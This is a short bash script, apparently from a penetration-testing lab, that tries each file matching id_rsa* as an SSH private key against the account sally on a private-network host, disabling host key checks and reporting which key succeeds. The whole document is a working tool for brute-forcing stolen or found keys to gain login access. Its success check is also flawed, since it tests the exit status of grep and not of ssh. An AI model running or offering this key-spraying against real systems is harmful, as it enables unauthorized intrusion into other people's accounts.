#!/bin/bash

for i in id_rsa*; do
    echo "[*] Trying $i"
    output=$(ssh -p 1055 -i "$i" \
        -o IdentitiesOnly=yes \
        -o PreferredAuthentications=publickey \
        -o StrictHostKeyChecking=no \
        -o BatchMode=yes \
        -o ConnectTimeout=5 \
        sally@10.150.150.55 exit 2>&1)

    if echo "$output" | grep -q "password"; then
        echo "[-] '$i' Wrong Key', skipping"
        continue
    fi

    if echo "$output" | grep -q "Permission denied"; then
        echo "[-] '$i' permission denied"
        continue
    fi

    if [ $? -eq 0 ]; then
        echo "[+] Success with $i"
        break
    fi
done
